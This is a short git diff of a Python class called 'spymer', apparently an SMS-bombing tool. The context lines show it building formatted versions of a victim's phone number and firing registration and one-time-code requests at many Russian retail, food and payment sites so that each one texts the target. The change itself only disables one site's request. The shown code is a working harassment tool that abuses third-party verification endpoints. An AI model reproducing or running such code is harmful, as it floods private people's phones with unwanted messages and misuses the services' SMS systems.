@@ -45,6 +45,7 @@ class spymer:
 		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
 		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
+		#_phoneMaxidom = _phone[]
 		print(showstatus(wrapsbrace('info', True) + ('Телефон: +{}').format(_phone)))
 		i = 1
 		iteration = 0
@@ -79,7 +80,7 @@ class spymer:
 			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _name, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
 			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 			lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
-			maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php?send_code_again=Y&email='+_name+'@gmail.com&phone='+_phoneMaxidom+'&code_type=phone', params={'send_code_again': 'Y', 'phone': _phoneMaxidom, 'email': _name+'@gmail.com', 'code_type': 'phone'})
+			#maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php?send_code_again=Y&email='+_name+'@gmail.com&phone='+_phoneMaxidom+'&code_type=phone', params={'send_code_again': 'Y', 'phone': _phoneMaxidom, 'email': _name+'@gmail.com', 'code_type': 'phone'})
 			mcdonalds = requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
 			oyorooms = requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
 			pswallet = requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'})
